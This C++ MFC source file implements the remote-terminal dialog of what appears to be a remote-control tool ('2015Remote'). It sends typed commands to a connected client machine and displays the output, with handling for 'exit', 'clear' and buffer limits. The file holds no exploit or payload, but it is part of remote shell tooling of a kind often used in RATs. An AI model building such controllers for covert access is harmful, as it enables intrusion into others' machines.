// ShellDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"

#define EDIT_MAXLENGTH 30000

BEGIN_MESSAGE_MAP(CAutoEndEdit, CEdit)
	ON_WM_CHAR()
END_MESSAGE_MAP()

void CAutoEndEdit::OnChar(UINT nChar, UINT nRepCnt, UINT nFlags) {
	// 将光标移动到文本末尾
	int nLength = GetWindowTextLength();
	SetSel(nLength, nLength);

	// 调用父类处理输入字符
	CEdit::OnChar(nChar, nRepCnt, nFlags);
}

// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: DialogBase(CShellDlg::IDD, pParent, IOCPServer, ContextObject, IDI_ICON_SHELL)
{
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_Edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	m_nCurSel = 0;
	m_nReceiveLength = 0;
	SetIcon(m_hIcon, TRUE);
	SetIcon(m_hIcon,FALSE);

	CString str;
	str.Format("%s - 远程终端", m_IPAddress);
	SetWindowText(str);

	BYTE bToken = COMMAND_NEXT;
	m_ContextObject->Send2Client(&bToken, sizeof(BYTE));  

	m_Edit.SetWindowTextA(">>");
	m_nCurSel = m_Edit.GetWindowTextLengthA();
	m_nReceiveLength = m_nCurSel;
	m_Edit.SetSel((int)m_nCurSel, (int)m_nCurSel);
	m_Edit.PostMessage(EM_SETSEL, m_nCurSel, m_nCurSel);
	m_Edit.SetLimitText(EDIT_MAXLENGTH);

	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


VOID CShellDlg::OnReceiveComplete()
{
	if (m_ContextObject==NULL)
	{
		return;
	}

	AddKeyBoardData();
	m_nReceiveLength = m_Edit.GetWindowTextLength();
}


#include <regex>
std::string removeAnsiCodes(const std::string& input) {
	std::regex ansi_regex("\x1B\\[[0-9;]*[mK]");
	return std::regex_replace(input, ansi_regex, "");
}

VOID CShellDlg::AddKeyBoardData(void)
{
	// 最后填上0

	//Shit\0
	m_ContextObject->InDeCompressedBuffer.WriteBuffer((LPBYTE)"", 1);           //从被控制端来的数据我们要加上一个\0
	Buffer tmp = m_ContextObject->InDeCompressedBuffer.GetMyBuffer(0);
	bool firstRecv = tmp.c_str() == std::string(">");
	CString strResult = firstRecv ? "" : CString("\r\n") + removeAnsiCodes(tmp.c_str()).c_str(); //获得所有的数据 包括 \0

	//替换掉原来的换行符  可能cmd 的换行同w32下的编辑控件的换行符不一致   所有的回车换行   
	strResult.Replace("\n", "\r\n");

	if (strResult.GetLength() + m_Edit.GetWindowTextLength() >= EDIT_MAXLENGTH)
	{
		CString text;
		m_Edit.GetWindowTextA(text);
		auto n = EDIT_MAXLENGTH - strResult.GetLength() - 5; // 留5个字符输入clear清屏
		if (n < 0) {
			strResult = strResult.Right(strResult.GetLength() + n);
		}
		m_Edit.SetWindowTextA(text.Right(max(n, 0)));
	}

	//得到当前窗口的字符个数
	int	iLength = m_Edit.GetWindowTextLength();    //kdfjdjfdir                                 
	//1.txt
	//2.txt
	//dir\r\n

	//将光标定位到该位置并选中指定个数的字符  也就是末尾 因为从被控端来的数据 要显示在 我们的 先前内容的后面
	m_Edit.SetSel(iLength, iLength);

	//用传递过来的数据替换掉该位置的字符    //显示
	m_Edit.ReplaceSel(strResult);   

	//重新得到字符的大小

	m_nCurSel = m_Edit.GetWindowTextLength(); 

	//我们注意到，我们在使用远程终端时 ，发送的每一个命令行 都有一个换行符  就是一个回车
	//要找到这个回车的处理我们就要到PreTranslateMessage函数的定义  
}

void CShellDlg::OnClose()
{
	CancelIO();
	// 等待数据处理完毕
	if (IsProcessing()) {
		ShowWindow(SW_HIDE);
		return;
	}

	DialogBase::OnClose();
}


CString ExtractAfterLastNewline(const CString& str)
{
	int nPos = str.ReverseFind(_T('\n'));
	if (nPos != -1)
	{
		return str.Mid(nPos + 1);
	}

	nPos = str.ReverseFind(_T('\r'));
	if (nPos != -1)
	{
		return str.Mid(nPos + 1);
	}

	return str;
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;
		//如果是可编辑框的回车键
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd)
		{
			//得到窗口的数据大小
			int	iLength = m_Edit.GetWindowTextLength();
			CString str;
			//得到窗口的字符数据
			m_Edit.GetWindowText(str);
			//加入换行符
			str += "\r\n";
			//得到整个的缓冲区的首地址再加上原有的字符的位置，其实就是用户当前输入的数据了
			//然后将数据发送出去
			LPBYTE pSrc = (LPBYTE)str.GetBuffer(0) + m_nCurSel;
#ifdef _DEBUG
            TRACE("[Shell]=> %s", (char*)pSrc);
#endif
			if (0 == strcmp((char*)pSrc, "exit\r\n")) { // 退出终端
				return PostMessage(WM_CLOSE);
			}
			else if (0 == strcmp((char*)pSrc, "clear\r\n")) { // 清理终端
				str = ExtractAfterLastNewline(str.Left(str.GetLength() - 7));
				m_Edit.SetWindowTextA(str);
				m_nCurSel = m_Edit.GetWindowTextLength();
				m_nReceiveLength = m_nCurSel;
				m_Edit.SetSel(m_nCurSel, m_nCurSel);
				return TRUE;
			}
			int length = str.GetLength() - m_nCurSel;
			m_ContextObject->Send2Client(pSrc, length);
			m_nCurSel = m_Edit.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd)
		{
			if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)  
				return true;
		}
		// 示例：
		//dir\r\n  5
	}

	return CDialog::PreTranslateMessage(pMsg);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	if ((pWnd->GetDlgCtrlID() == IDC_EDIT) && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);   //设置白色的文本
		clr = RGB(0,0,0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		return CreateSolidBrush(clr);  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
	return hbr;
}


void CShellDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);

	if (!m_Edit.GetSafeHwnd()) return; // 确保控件已创建

	// 计算新位置和大小
	CRect rc;
	m_Edit.GetWindowRect(&rc);
	ScreenToClient(&rc);

	// 重新设置控件大小
	m_Edit.MoveWindow(0, 0, cx, cy, TRUE);
}
